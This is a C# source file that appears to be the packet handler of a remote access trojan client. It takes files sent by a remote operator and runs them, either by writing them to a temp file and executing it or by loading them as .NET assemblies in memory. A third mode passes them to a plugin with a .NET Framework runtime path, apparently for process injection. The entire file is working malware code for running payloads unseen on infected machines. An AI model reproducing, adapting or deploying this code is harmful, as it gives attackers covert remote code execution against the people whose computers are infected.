using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Threading;
using Client.MessagePack;

namespace Client.Handle_Packet
{
    public class HandleSendTo
    {
        public void SendToDisk(MsgPack unpack_msgpack)
        {
            try
            {
                string fullPath = Path.GetTempFileName() + unpack_msgpack.ForcePathObject("Extension").AsString;
                unpack_msgpack.ForcePathObject("File").SaveBytesToFile(fullPath);
                Process.Start(fullPath);
                if (unpack_msgpack.ForcePathObject("Update").AsString == "true")
                {
                    new HandleUninstall();
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex);
            }
        }

        public void SendToMemory(MsgPack unpack_msgpack)
        {
            try
            {
                byte[] buffer = unpack_msgpack.ForcePathObject("File").GetAsBytes();
                string injection = unpack_msgpack.ForcePathObject("Inject").AsString;
                byte[] plugin = unpack_msgpack.ForcePathObject("Plugin").GetAsBytes();
                if (injection.Length == 0)
                {
                    new Thread(delegate ()
                    {
                        Assembly loader = Assembly.Load(buffer);
                        object[] parm = null;
                        if (loader.EntryPoint.GetParameters().Length > 0)
                        {
                            parm = new object[] { new string[] { null } };
                        }
                        loader.EntryPoint.Invoke(null, parm);
                    })
                    { IsBackground = true }.Start();

                }
                else
                {
                    new Thread(delegate ()
                    {
                        Assembly loader = Assembly.Load(plugin);
                        MethodInfo meth = loader.GetType("Plugin.Program").GetMethod("Run");
                        meth.Invoke(null, new object[] { buffer, Path.Combine(RuntimeEnvironment.GetRuntimeDirectory().Replace("Framework64", "Framework"), injection) });
                    })
                    { IsBackground = true }.Start();
                }
            }
            catch (Exception ex)
            {
                Packet.Error(ex);
            }
        }
    }
}